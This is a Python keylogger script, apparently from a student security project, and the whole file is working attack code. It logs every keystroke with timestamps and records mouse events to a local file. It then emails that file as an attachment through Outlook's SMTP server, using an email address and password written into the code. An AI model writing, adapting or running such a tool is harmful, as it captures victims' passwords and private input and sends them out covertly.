import keyboard
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import mouse

 

send_me_mail=True #set this to True if you want to recieve the logged keys in a text file via email. 

def send_logged_keys():
	Sender_Email = "projettpsecu@outlook.com" #write your own email address, concider using an outlook email address
	Recv_Email = Sender_Email #write the recepient email address, or leave it as is to send the email to yourself
	pswd = "Pr0jet_TP" #write your email password
	
	
	msg = MIMEMultipart('alternative')
	t = time.localtime()
	current = time.strftime("%D - %H:%M:%S", t)
	msg['Subject'] = "LOGGED KEYS "+current
	msg['From'] = Sender_Email
	msg['To'] = Recv_Email

	filename = "logged_keys.txt"
	f = file(filename)
	attachment = MIMEText(f.read())
	attachment.add_header('Content-Disposition', 'attachment',filename=filename)
	msg.attach(attachment)

	s = smtplib.SMTP('smtp.office365.com', 587) #smtp server for outlook
	s.starttls()
	s.login(Sender_Email, pswd)
	s.sendmail(Sender_Email, Recv_Email, msg.as_string())
	s.quit()

f = open("logged_keys.txt", "w")
events = [] #list to contain mouse events

while True:

	mouse.hook(events.append)   #starting the mouse recording
	key = keyboard.read_key(suppress=False) #starting keyboard recording
	
	#the escape key is the only way to stop the script. you can change it to any key that you desire.
	if key == "esc":
		f.write("\n"+"*"*50+"[MOUSE INFO]"+"*"*50+"\n")
		mouse.unhook(events.append) #Stopping the mouse recording
		for line in events:
			f.write(str(line))
			f.write("\n")
		mouse.play(events) 
		
		if send_me_mail==True:
			f.close()
			send_logged_keys()
		break
		
	while keyboard.is_pressed(key):
		pass
        
	t = time.localtime()
	current=time.strftime("[KEY TYPED AT %H:%M:%S]: ", t)
	f.write(current+key)
	f.write('\n')
	

f.close()